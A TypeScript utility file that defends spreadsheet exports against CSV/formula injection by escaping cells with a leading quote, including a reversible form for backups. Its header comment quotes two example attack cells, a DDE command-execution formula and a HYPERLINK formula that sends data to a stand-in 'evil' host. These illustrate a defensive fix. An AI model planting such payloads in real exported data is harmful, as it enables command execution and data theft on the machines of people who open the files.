/**
 * CSV / spreadsheet formula-injection neutralization (OWASP "CSV Injection" /
 * CWE-1236). A cell whose text begins with = + - @ TAB or CR is interpreted as
 * a formula by Excel / LibreOffice / Google Sheets when the exported file is
 * opened. Since operator-supplied strings (AHU names, remarks, performer names)
 * flow verbatim into our .xlsx exports and those files are opened on
 * reviewers'/auditors' workstations, an attacker-controlled cell like
 * `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil/"&<exfil>)` would execute.
 *
 * Neutralize by prefixing a single quote (the standard, Excel-recognized escape
 * that renders the cell as literal text). Non-string values pass through
 * unchanged so numbers/dates keep their type.
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

export function neutralizeFormula<T>(value: T): T | string {
  if (typeof value !== 'string' || value.length === 0) return value;
  return FORMULA_TRIGGER.test(value) ? `'${value}` : value;
}

/**
 * The REVERSIBLE form, for a file the app reads back: the CSV backup (operator
 * decision 2026-10-22, "exact restore"). Text that is any run of quotes
 * followed by a trigger gets one more quote, and restoreNeutralizedFormula
 * takes exactly one off text that is one or more quotes followed by a trigger.
 * That maps every string back to itself, including one that already began with
 * `'=`, which the one-way form above leaves alone, so a reader could not tell
 * it from a neutralised `=`.
 */
const QUOTES_THEN_TRIGGER = /^'*[=+\-@\t\r]/;
const NEUTRALIZED = /^'+[=+\-@\t\r]/;

export function neutralizeFormulaReversibly(value: string): string {
  return QUOTES_THEN_TRIGGER.test(value) ? `'${value}` : value;
}

export function restoreNeutralizedFormula(value: string): string {
  return NEUTRALIZED.test(value) ? value.slice(1) : value;
}

/**
 * Map an object's string values through {@link neutralizeFormula}, leaving
 * non-strings intact. Use when building an ExcelJS `addRow({...})` payload from
 * data that contains any user-supplied text.
 */
export function neutralizeRow<T extends Record<string, unknown>>(row: T): T {
  const out: Record<string, unknown> = {};
  for (const [k, v] of Object.entries(row)) out[k] = neutralizeFormula(v);
  return out as T;
}
